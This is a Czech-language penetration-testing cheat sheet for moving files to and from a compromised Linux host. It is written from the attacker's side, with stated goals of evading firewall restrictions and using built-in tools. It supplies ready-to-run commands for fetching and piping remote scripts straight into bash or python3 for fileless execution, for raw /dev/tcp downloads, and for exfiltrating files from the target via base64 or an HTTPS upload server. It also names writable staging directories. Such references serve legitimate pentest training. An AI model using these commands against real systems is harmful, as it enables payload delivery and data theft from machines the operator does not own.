# Linux File Transfer (Cheat Sheet)

Cíl:

- přenos souborů Linux ↔ Linux/Windows
- obejití omezení firewallu
- využití dostupných nástrojů systému

---

# 1. Base64 (bez sítě)

Použití:

- nemáš otevřenou komunikaci
- pouze shell

## Upload z cíle:

Na cíli:

```
cat soubor | base64 -w 0
```

Na útočníkovi:

```
echo "BASE64" | base64 -d > soubor
```

Vždy ověř:

```
md5sum soubor
```

---

# 2. HTTP Download

## wget

```
wget http://IP/file -O /tmp/file
```

## curl

```
curl -o /tmp/file http://IP/file
```

---

# 3. Fileless spuštění

Spuštění přímo přes pipe:

Bash:

```
curl http://IP/script.sh | bash
```

Python:

```
wget -qO- http://IP/tool.py | python3
```

Výhoda:

- soubor není uložen na disk

---

# 4. SSH / SCP (Port 22)

Start SSH:

```
sudo systemctl start ssh
```

Stažení:

```
scp user@IP:/home/user/file .
```

Upload:

```
scp file user@IP:/tmp/
```

---

# 5. Alternativní metody

## Bash /dev/tcp

Pokud není wget/curl:

```
exec 3<>/dev/tcp/IP/80

echo -e "GET /file HTTP/1.1\n\n" >&3

cat <&3
```

---

# 6. Rychlý HTTP server

## Python

```
python3 -m http.server 8000
```

## PHP

```
php -S 0.0.0.0:8000
```

## Ruby

```
ruby -run -ehttpd . -p8000
```

---

# 7. HTTPS Upload

Vytvoření certifikátu:

```
openssl req -x509 \
-out server.pem \
-keyout server.pem \
-newkey rsa:2048 \
-nodes \
-sha256
```

Upload server:

```
python3 -m uploadserver 443 \
--server-certificate server.pem
```

Upload z cíle:

```
curl -X POST \
https://IP/upload \
-F 'files=@file' \
--insecure
```

---

# Living Off The Land

Hledat dostupné nástroje:

```
which wget
which curl
which nc
which python3
which php
which perl
```

---

# Zajímavé upload adresáře

|Cesta|Poznámka|
|---|---|
|`/tmp`|často zapisovatelný|
|`/var/tmp`|přežívá restart|
|`/dev/shm`|RAM filesystem|

---

# Pentest Checklist

☐ Je dostupný wget/curl?  
☐ Mám právo zápisu?  
☐ Funguje HTTP/HTTPS komunikace?  
☐ Jde použít fileless spuštění?  
☐ Je blokovaný outbound traffic?  
☐ Ověřil jsem hash souboru?